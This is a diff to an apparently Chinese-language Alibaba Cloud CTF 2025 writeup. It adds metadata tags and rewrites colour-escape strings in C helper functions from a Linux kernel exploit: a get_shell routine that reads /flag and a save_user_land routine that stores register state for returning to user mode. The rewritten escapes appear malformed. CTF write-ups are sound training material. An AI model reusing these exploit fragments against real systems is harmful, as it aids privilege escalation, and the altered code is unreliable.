@@ -67,6 +67,9 @@ prerequisites:
 - Linux 内核内存保护（readonly map）
 - 整数溢出 + 数学表达式自检绕过
 - CUDA PTX 反汇编与 AES S-box 还原
+contest_normalized: "阿里云CTF"
+contest_year: 2025
+subcategory_guess: "rce"
 ---
 # 阿里云CTF2025 Writeup
 
@@ -1971,7 +1974,7 @@ void error_quit(const char* msg) {
 }
 
 void get_shell() {
-    printf(" 33[35mGetShell Success! 33[0mn");
+    printf("\\x0033[35mGetShell Success!\\x0033[0mn");
     int fd = open("/flag", 0);
     char flag[0x100] = { 0 };
     read(fd, flag, 0x100);
@@ -1980,7 +1983,7 @@ void get_shell() {
 }
 
 void binary_dump(char* buf, size_t size, long long base_addr) {
-    printf(" 33[33mDump:n 33[0m");
+    printf("\\x0033[33mDump:n\\x0033[0m");
     char* ptr;
     for (int i = 0; i < size / 0x20; i++) {
         ptr = buf + i * 0x20;
@@ -2023,12 +2026,12 @@ void save_user_land() {
         ".att_syntax;"
     );
     user_rip = (unsignedlong)get_shell;
-    puts(" 33[34mUser land saved. 33[0m");
-    printf(" 33[34muser_ss:0x%llx 33[0mn", user_ss);
-    printf(" 33[34muser_sp:0x%llx 33[0mn", user_sp);
-    printf(" 33[34muser_rflags:0x%llx 33[0mn", user_rflags);
-    printf(" 33[34muser_cs:0x%llx 33[0mn", user_cs);
-    printf(" 33[34muser_rip:0x%llx 33[0mn", user_rip);
+    puts("\\x0033[34mUser land saved.\\x0033[0m");
+    printf("\\x0033[34muser_ss:0x%llx\\x0033[0mn", user_ss);
+    printf("\\x0033[34muser_sp:0x%llx\\x0033[0mn", user_sp);
+    printf("\\x0033[34muser_rflags:0x%llx\\x0033[0mn", user_rflags);
+    printf("\\x0033[34muser_cs:0x%llx\\x0033[0mn", user_cs);
+    printf("\\x0033[34muser_rip:0x%llx\\x0033[0mn", user_rip);
 }
 
 void circle_print(char buf[], int line_size, int size) {
